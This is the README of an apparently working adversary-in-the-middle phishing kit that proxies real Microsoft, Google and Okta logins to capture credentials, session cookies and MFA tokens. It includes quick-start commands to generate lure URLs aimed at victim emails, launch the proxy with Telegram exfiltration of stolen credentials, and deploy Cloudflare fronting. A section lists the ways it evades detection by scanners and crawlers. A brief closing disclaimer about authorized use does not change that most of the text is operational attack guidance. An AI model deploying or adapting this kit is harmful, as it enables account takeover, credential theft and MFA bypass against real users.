# Azure Phishing Kit — AiTM Reverse Proxy

> Replicates the commercial PhaaS attack analyzed from an active phishing campaign.
> Full threat intel: `docs/threat-intel-report.md`

## What This Is

An Evilginx-style Adversary-in-the-Middle (AiTM) reverse proxy. The victim sees
the REAL login page (Microsoft/Google/Okta) proxied through your server.
Credentials, session cookies, and MFA tokens are captured. No fake landing page
— undetectable by DOM comparison.

## Architecture

```
Victim → Cloudflare Worker (TLS) → proxy-server (Go) → Real Login
                                       │
                                       ├── Bootloader (decrypts fragment, sets cookies)
                                       ├── Response rewriter (URLs, cookies, CSP)
                                       ├── Telegram capture (creds + session .txt)
                                       ├── JSONL event log (analytics)
                                       └── Analytics dashboard (internal)
```

## Quick Start

```bash
# 1. Generate encryption key
cd payload-generator && go run keygen.go
# Copy the base64 key

# 2. Set key in bootloader
# Edit proxy-server/bootloader.html
# Set: const _k = '<your-key>';

# 3. Generate phishing URL
cd ../payload-generator
go run . --key <key> --email victim@corp.com \
  --redirect https://login.microsoftonline.com \
  --campaign my-campaign

# 4. Start proxy server
cd ../proxy-server
TELEGRAM_BOT_TOKEN="..." TELEGRAM_CHAT_ID="..." go run .

# 5. Start analytics (optional)
cd ../analytics-server
go run . --token "your-secret-token"

# 6. Deploy CDN fronting
cd ../cdn-config
npx wrangler deploy
```

## Components

| Component | Directory | Purpose |
|-----------|-----------|---------|
| Proxy Server | `proxy-server/` | AiTM reverse proxy, Telegram exfil, bootloader |
| Payload Generator | `payload-generator/` | AES-256-GCM encrypted lure URLs |
| Analytics Server | `analytics-server/` | Campaign dashboard, JSONL event tracking |
| CDN Config | `cdn-config/` | Cloudflare Worker reverse proxy |
| URL Generator | `scripts/` | Assembles phishing URLs |

## Detection Evasion

- **AiTM proxy only** — victim sees real login page, zero DOM fingerprinting
- **URL fragment** (`#`) never sent to server — invisible to network scanners
- **AES-256-GCM with random prefix** — no static signatures, no `mv=`/`bXY9` pattern
- **CDN fronting** — victims see Cloudflare TLS cert, origin IP hidden
- **Obfuscated JS** — all symbols renamed, no `AES_KEY_B64` or `decryptAESGCM` strings
- **Bot blocking** — crawlers get 404, not phishing pages
- **Rate limiting** — 10 req/min per IP
- **Generic endpoints** — `/auth`, `_s`, `_c` — no `/capture` or `__upstream` signatures

## Requirements

- Go 1.22+ (proxy-server, payload-generator, analytics-server)
- Node.js 18+ (cdn-config — Cloudflare Wrangler)
- Cloudflare account (for CDN fronting)
- Telegram bot (for capture notifications)

## Warning

This is a security research and education tool. Use only for authorized
phishing simulations, penetration testing, and red team operations with
explicit written authorization.
